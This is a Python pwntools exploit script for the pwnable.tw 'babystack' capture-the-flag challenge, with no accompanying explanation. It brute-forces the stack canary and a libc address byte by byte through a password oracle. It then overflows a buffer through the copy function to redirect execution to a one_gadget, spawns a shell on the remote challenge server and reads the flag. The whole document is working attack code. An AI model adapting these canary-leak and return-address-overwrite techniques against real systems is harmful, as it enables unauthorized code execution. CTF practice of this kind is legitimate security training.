#!/usr/bin/env python
from pwn import *
# context.log_level='debug'
# p=process('./babystack',env={'LD_PRELOAD':'./libc_64.so.6'})
p=remote('chall.pwnable.tw',10205)
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('>> ')
    sd(str(i))

def copy(payload):
    sd('3')
    ru('Copy :')
    sd(payload)

def logout():
    sd('1')

def psw(payload,sline=1):
    sd('1')
    ru('Your passowrd :')
    sd(payload)

def debugf(payload=''):
    gdb.attach(p,payload)

canary=''
ru('>> ')
for i in range(16):
    for j in range(1,0xff):
        if j==0xa:
            continue

        payload=canary+p8(j)+'\n'
        psw(payload)
        line=ru('>> ')
        if 'Success' in line:
            canary+=p8(j)
            logout()
            break

# print('=====================================')
# gdb.attach(p,'nb E43\nnb EBB')
ru('>> ')
payload=canary+'\x00'*0x10+'a'*0x20+canary
psw(payload)

ru('>> ')
payload='a'*0x3f
copy(payload)

ru('>> ')
sd('1')

glo=0
libc_str=''
bypass=canary
ru('>> ')
for i in range(6):
    for j in range(1,0xff):
        if j==0xa:
            continue
        # print('=====================')
        # if glo==0:
            # gdb.attach(p,'nb E43')
            # glo+=1
        payload=bypass+p8(j)+'\n'
        psw(payload)
        line=ru('>> ')
        if "Success" in line:
            bypass+=p8(j)
            libc_str+=p8(j)
            logout()
            break

libc_addr=u64(libc_str.ljust(8,'\x00'))
# print(hex(libc_addr))
# print(canary)
libc_base=libc_addr-0x3c5631+0x1000
one_off=0x45216
# one_off=0x4526a
# one_off=0xef6c4
# one_off=0xf0567
one=libc_base+one_off
# gdb.attach(p,'nb 1051')
ru('>> ')
payload=(canary.ljust(0x3f,'\x00')+'a')+canary+'a'*0x18+p64(one)
psw(payload)
ru('>> ')
copy('a'*0x3f)
# gdb.attach(p,'nb 1051')
# print(hex(libc_base))
ru('>> ')
sd('2')
# print('=======================')
print(hex(one))
p.sendline('cat /home/BabyStack/flag')
p.interactive()